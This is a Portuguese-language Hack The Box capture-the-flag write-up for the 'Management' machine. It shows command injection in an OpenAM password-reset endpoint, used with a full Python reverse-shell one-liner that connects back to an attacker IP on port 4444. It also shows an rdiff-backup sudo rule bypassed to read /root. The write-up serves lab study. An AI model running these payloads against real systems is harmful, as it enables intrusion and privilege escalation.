Write-up: Management (Hack The Box) — Do Acesso Inicial ao Root

Este write-up documenta a exploração bem-sucedida da máquina Management do Hack The Box, detalhando o vetor de acesso inicial (focado em exploração de aplicação web e lógica) e a escalação de privilégio subsequente.
1. Reconhecimento e Descoberta do Perímetro

A fase de enumeração revelou a exposição de um painel de gerenciamento de identidade e autenticação (ForgeRock OpenAM) rodando sob o subdomínio sso.management.htb, além de um painel de gerenciamento de TI (GLPI).

O foco inicial direcionou-se para a aplicação OpenAM devido a endpoints expostos de redefinição de senha e validação de usuários.
2. Acesso Inicial (Initial Access)

Investigando os fluxos de recuperação de senha da aplicação OpenAM (/openam/ui/PWResetUserValidation), identificou-se uma falha de lógica e tratamento inadequado de entrada que permitia a injeção e execução de comandos no sistema operacional subjacente.

Para validar o vetor e capturar o acesso, utilizou-se um script em Python estruturado para injetar um payload de Reverse Shell diretamente no parâmetro vulnerável:
Bash

python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.17.83\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"

O Funcionamento do Exploit:

    O Alvo (--url): Aponta para o endpoint de validação de redefinição de senha do OpenAM.

    O Payload (Python Reverse Shell): Cria um socket TCP conectando de volta para o IP do atacante (10.10.17.83 na porta 4444), redireciona os descritores de arquivo padrão (stdin, stdout, stderr) para esse socket e invoca um interpretador interativo (/bin/bash) através do módulo pty.

A execução bem-sucedida do comando resultou no ganho de acesso ao sistema sob os privilégios da conta de serviço da aplicação, permitindo a leitura da flag de usuário (user.txt).
3. Escalizacão de Privilégio para Root (Privilege Escalation)

Após a consolidação do acesso inicial, a enumeração de permissões sudo (sudo -l) revelou uma regra permitindo que o usuário executasse o binário rdiff-backup como root:
Plaintext

User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup
        --restrict-mode read-only *

A Exploração da Restrição (--restrict-path)

O comando permitia rodar o rdiff-backup em modo servidor com uma restrição de caminho (--restrict-path /opt/backup). No entanto, a lógica do argumento aceitava o placeholder de conexão remota (/::/root), fazendo com que o cliente injetasse um novo argumento --restrict-path / no momento da execução via sudo.

Isso sobrescreveu a restrição original e permitiu ler todo o sistema de arquivos com privilégios de root.
Comando de Extração:
Bash

rdiff-backup \
  --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s" \
  backup /::/root /tmp/root_backup

Com o espelhamento do diretório /root concluído para /tmp/root_backup, recuperou-se a flag de administrador (root.txt) e os artefatos críticos de sistema, fechando o ciclo de exploração da máquina.
